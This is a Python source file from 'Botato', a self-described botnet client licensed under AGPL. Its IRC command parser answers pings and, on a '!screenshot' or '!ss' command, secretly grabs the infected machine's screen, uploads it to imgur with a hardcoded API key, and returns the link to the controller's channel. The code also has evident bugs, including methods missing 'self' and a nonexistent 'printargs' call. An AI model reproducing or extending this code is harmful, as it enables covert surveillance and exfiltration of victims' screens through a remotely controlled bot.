''' Botato - A botnet client for native execution across supported networks for remote functionality.
	Copyright (C) 2014 EnKrypt
	Copyright (C) 2014 Jir0
	Copyright (C) 2014 Laneone

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation,either version 3 of the License,or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.

	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not,see <http://www.gnu.org/licenses/>.
'''

from PIL import ImageGrab
import pycurl
import cStringIO
import untangle

class Parse(object): #A class for a single static method is not needed. Removal should be considered.
	'Interprets incoming commands and directs bot to respond accordingly'
	
	def parsetext(text,con):
		com=text.split(" ",3)
		try:
			if com[0]=="PING":
				return "PONG "+text.split()[1]
			elif (com[3].strip()+" ").startswith(":!ping "):
				if com[3].strip().endswith("!ping"):
					return "PRIVMSG "+con.channel+" :Pong"
				else:
					return "PRIVMSG "+con.channel+" :Pong"+com[3].strip()[6:]
			elif (com[3].strip()+" ").startswith(":!screenshot ") or (com[3].strip()+" ").startswith(":!ss "):
				if com[3].strip().endswith("!screenshot") or com[3].strip().endswith("!ss"):
					return "PRIVMSG "+con.channel+" :"+screengrab()
				elif com[3].strip()[6:].lower()==con.nick.lower():
					return "PRIVMSG "+con.channel+" :"+screengrab()
		except Exception as e:
			e.printargs()
		return None
		
	def screengrab():
		im = ImageGrab.grab()
		img = 'screenshot.png'
		im.save(img)
		xml = upload(img)
		return process(xml)
		
	def upload(image):
		response = cStringIO.StringIO()
		c = pycurl.Curl()
		values = [
				("key", '0e74360592046d7'),
				("image", (c.FORM_FILE, image))]
		c.setopt(c.URL, "http://api.imgur.com/2/upload.xml")
		c.setopt(c.HTTPPOST, values)
		c.setopt(c.WRITEFUNCTION, response.write)
		c.perform()
		c.close()
		return response.getvalue()
		
	def process(xml):
		o = untangle.parse(xml)
		url = o.upload.links.original.cdata
		return url